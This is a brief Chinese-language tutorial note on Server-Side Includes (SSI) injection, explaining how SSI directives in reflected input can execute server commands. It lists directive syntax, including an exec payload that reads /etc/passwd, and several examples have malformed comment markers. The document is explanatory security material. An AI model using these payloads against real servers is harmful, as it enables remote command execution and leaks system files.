# SSI

(shtml漏洞)


SSI 注入全称Server-SideIncludes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。



## SSI介绍与利用

SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。


从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。


在很多业务中，用户输入的内容会显示在页面中。比如，一个存在反射型XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，同时服务器又开启了对SSI的支持的话就会存在SSI漏洞。


从定义中看出，页面中有一小部分是动态输出的时候使用SSI，比如：


·       文件相关的属性字段


·       当前时间


·       访客IP


·       调用CGI程序


#####################################################################


怎么说呢，其实讲起来还挺简单的


<!--#exec cmd="命令"-->


这个漏洞依赖于服务器开启一个模式叫做注释行的写入


也就是比如一个HTML网页


我们可以写入注释


然后刚好这条注释实可以以某种方式进行代码执行的。


```plain
其余的话还有：
①显示服务器端环境变量<#echo>
本文档名称：
<!–#echo var="DOCUMENT_NAME"–>
现在时间：
<!–#echo var="DATE_LOCAL"–>
显示IP地址：
<! #echo var="REMOTE_ADDR"–>
②将文本内容直接插入到文档中<#include>
<! #include file="文件名称"–>
<!--#include virtual="index.html" -->
<! #include virtual="文件名称"–>
<!--#include virtual="/www/footer.html" -->
注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径
③显示WEB文档相关信息<#flastmod><#fsize>(如文件制作日期/大小等)
文件最近更新日期：
<! #flastmod file="文件名称"–>
文件的长度：
<!–#fsize file="文件名称"–>
④直接执行服务器上的各种程序<#exec>(如CGI或其他可执行程序)
<!–#exec cmd="文件名称"–>
<!--#exec cmd="cat /etc/passwd"-->
<!–#exec cgi="文件名称"–>
<!--#exec cgi="/cgi-bin/access_log.cgi"–>
相当于在服务器端执行了所需要的代码，返回查找即可
Plain Text
```





